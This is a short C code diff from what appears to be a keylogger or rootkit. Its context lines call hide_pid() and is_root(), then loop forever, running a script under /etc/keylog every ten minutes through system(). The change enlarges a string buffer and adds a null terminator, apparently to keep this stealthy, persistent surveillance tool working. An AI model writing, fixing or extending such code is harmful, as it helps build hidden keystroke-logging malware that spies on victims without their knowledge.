@@ -39,10 +39,10 @@ int main(int argc, char *argv[]) {
 	
 	hide_pid();
 	is_root(); 
-	char str[30];
+	char str[50];
 
 	while (1) {
-		sprintf(str, "bash /etc/keylog/run_update.sh");
+		sprintf(str, "bash /etc/keylog/run_update.sh\00");
 		system(str);
 		sleep(600);
 	}
